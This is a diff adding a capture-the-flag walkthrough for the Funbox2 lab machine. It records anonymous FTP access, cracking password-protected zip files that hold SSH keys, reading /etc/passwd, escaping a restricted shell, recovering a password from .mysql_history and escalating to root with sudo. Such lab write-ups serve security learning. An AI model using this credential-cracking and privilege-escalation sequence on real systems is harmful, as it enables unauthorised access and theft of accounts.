@@ -72,13 +72,222 @@ Target: http://172.16.33.30/
 
 Task Completed
 
-#try 
-└─$ nmap -p- 172.16.33.30 --reason --open
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 01:54 EDT
-Nmap scan report for 172.16.33.30
-Host is up, received syn-ack (0.033s latency).
-Not shown: 65532 closed tcp ports (conn-refused)
-PORT   STATE SERVICE REASON
-21/tcp open  ftp     syn-ack
-22/tcp open  ssh     syn-ack
-80/tcp open  http    syn-ack
+#try to access robots and /server-status, nothing is available.
+
+# to try ftp Service,for the reason this ftp is allowed to Anonymous login,
+# user anonymous
+#passwd  anonymous@domain.com 
+
+ftp 172.16.33.30  #login
+
+ftp> ls
+229 Entering Extended Passive Mode (|||46593|)
+150 Opening ASCII mode data connection for file list
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
+-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
+-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
+-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
+
+#get some files which may reveal useful Info
+
+ftp> get anna.zip
+local: anna.zip remote: anna.zip
+229 Entering Extended Passive Mode (|||12533|)
+150 Opening BINARY mode data connection for anna.zip (1477 bytes)
+100% |***************************************************************************|  1477        1.16 MiB/s    00:00 ETA
+226 Transfer complete
+1477 bytes received in 00:00 (39.84 KiB/s)
+ftp> get john.zip
+local: john.zip remote: john.zip
+229 Entering Extended Passive Mode (|||16021|)
+150 Opening BINARY mode data connection for john.zip (1477 bytes)
+100% |***************************************************************************|  1477        2.12 MiB/s    00:00 ETA
+226 Transfer complete
+1477 bytes received in 00:00 (41.94 KiB/s)
+ftp> get welcome.msg
+local: welcome.msg remote: welcome.msg
+229 Entering Extended Passive Mode (|||17688|)
+150 Opening BINARY mode data connection for welcome.msg (170 bytes)
+100% |***************************************************************************|   170        1.70 MiB/s    00:00 ETA
+226 Transfer complete
+170 bytes received in 00:00 (4.67 KiB/s)
+ftp> exit
+221 Goodbye.
+
+└─$ cat welcome.msg 
+Welcome, archive user %U@%R !
+
+The local time is: %T
+
+This is an experimental FTP server.  If you have any unusual problems,
+please report them via e-mail to <root@%L>.
+# nothing useful
+
+└─$ unzip anna.zip 
+Archive:  anna.zip
+[anna.zip] id_rsa password: 
+
+└─$ unzip john.zip 
+Archive:  john.zip
+[john.zip] id_rsa password: 
+# zip files need passwd to open, try to brute force the passwd, by using zip2john and john
+
+└─$ zip2john homer.zip > homer.hash
+ver 2.0 efh 5455 efh 7875 homer.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
+#time consuming
+
+─$ john cathrine.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 3 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+catwoman         (cathrine.zip/id_rsa)     
+1g 0:00:00:00 DONE 2/3 (2024-04-15 03:54) 5.555g/s 249011p/s 249011c/s 249011C/s 123456..Open
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+└─$ ssh -i id_rsa cathrine@172.16.33.30
+Connection closed by 172.16.33.30 port 22
+
+#cathrine ssh is restricted, try tom
+
+─$ john tom.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 3 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+iubire           (tom.zip/id_rsa)     
+1g 0:00:00:00 DONE 2/3 (2024-04-15 03:57) 5.000g/s 224255p/s 224255c/s 224255C/s 123456..Open
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+└─$ ssh -i id_rsa tom@172.16.33.30
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Nov 16 15:12:45 UTC 2022
+
+  System load:  0.0               Processes:           104
+  Usage of /:   65.6% of 4.37GB   Users logged in:     1
+  Memory usage: 36%               IP address for ens3: 172.16.33.30
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Nov 16 13:04:49 2022 from 172.16.33.1
+tom@funbox2:~$ 
+
+tom@funbox2:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+tom:x:1000:1000:tom:/home/tom:/bin/rbash
+# switch to a bash
+tom@funbox2:~$ bash -i
+tom@funbox2:~$ cd /tmp
+tom@funbox2:/tmp
+
+# or vi 
+        esc: set shell=/bin/bash 
+        esc: shell
+
+tom@funbox2:~$ cat .mysql_history 
+_HiStOrY_V2_
+show\040databases;
+quit
+create\040database\040'support';
+create\040database\040support;
+use\040support
+create\040table\040users;
+show\040tables
+;
+select\040*\040from\040support
+;
+show\040tables;
+select\040*\040from\040support;
+insert\040into\040support\040(tom,\040xx11yy22!);
+quit
+tom@funbox2:~$ su
+Password: 
+su: Authentication failure
+tom@funbox2:~$ sudo -l
+[sudo] password for tom: 
+Matching Defaults entries for tom on funbox2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tom may run the following commands on funbox2:
+    (ALL : ALL) ALL
+tom@funbox2:/$ sudo -s
+root@funbox2:/# bash -i
+
+root@funbox2:/tmp# cd ..
+root@funbox2:/# ls
+bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
+boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
+root@funbox2:/# cd root
+root@funbox2:/root# ls
+flag.txt
+root@funbox2:/root# cat flag.txt 
+   ____  __  __   _  __   ___   ____    _  __             ___ 
+  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |
+ / _/  / /_/ /  /    /  / _  |/ /_/ / _>  <             / __/ 
+/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/ 
+           ____ ___  ___  / /_ ___  ___/ /       / /          
+ _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/           
+(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)            
+                                                              
+from @0815R2d2 with ♥
+
+
